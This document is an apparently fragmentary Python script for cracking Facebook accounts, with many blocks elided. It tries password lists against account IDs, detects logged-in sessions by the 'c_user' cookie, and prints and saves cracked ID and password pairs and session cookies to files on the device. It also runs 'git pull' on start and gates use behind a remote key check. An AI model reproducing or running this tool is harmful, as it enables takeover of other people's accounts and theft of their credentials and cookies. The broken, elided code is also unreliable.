#ANSH - _ - ANSH _-_ON_-_FIRE !¡●●
#FULLY WRITTEN BY ANISH YARI 😇
from os import path
import os,base64,zlib,pip,urllib,time
print('\x1b[1;92m[✓] PLEASE WAIT CHECKING UPDATE...')
time.sleep(1.5)
print('\x1b[1;92m[✓] PLEASE WAIT CHECKING 34&64 bit...')
time.sleep(1.5)
os.system('git pull')
os.system('clear')
print('\x1b[1;92m[✓] UPDATE DONE...')
time.sleep(2)
os.system(f'xdg-open https://facebook.com/badshahking21 ')
try:
...
def ANSHALWAYSONFIRE():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/UNKNOWN.txt').text
...
\033[1;31m×××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××\033[1;37m""")           
  ...
  os.system(f'xdg-open https://m.me/badshahking21')
  time.sleep(1)
  print(f"\033[1;37mChecking Your Key")
  try:
    httpCaht = requests.get(f"https://github.com/UNKNOWN.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open {tan}://wa.me/+9779762266618?text='+id)
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
def Ansh():
	...
	if me in ["1", "01","11","A","a"]:
		...
		try:
			...
			exit()
		print('[1] METHOD   (1) [2] METHOD  (2) [3] METHOD  (3) [4] METHOD  (4)')
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [ UNKNOWN ] \033[1;36m×\033[1;37m %s \033[1;36m×\033[1;37m OK \033[1;36m×\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Ansh=session.cookies.get_dict().keys()
                        if "c_user" in Ansh:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [SUCCESSFULL] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie❀]\033[1;37m : '+coki)
                                open(f'/sdcard/SUCCESSFULL×OK×M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Fof:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [CHECKPOINT🤧] '+ids+' • '+pas+'\033[1;97m')
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Ansh:
                                ...
                                cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie❀]\033[1;37m : '+coki)
                                open(f'/sdcard/SUCCESSFULL×M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Ansh:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [CHECKPOINT] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/CHECKPOINT.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Ansh:
                                ...
                                cek_apk(session,coki)
                                print(f'\033[1;36m [Cookie❀]\033[1;37m : '+coki)
                                open(f'/sdcard/SUCCESSFULL.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Ansh:
                                if 'y' in pcp:
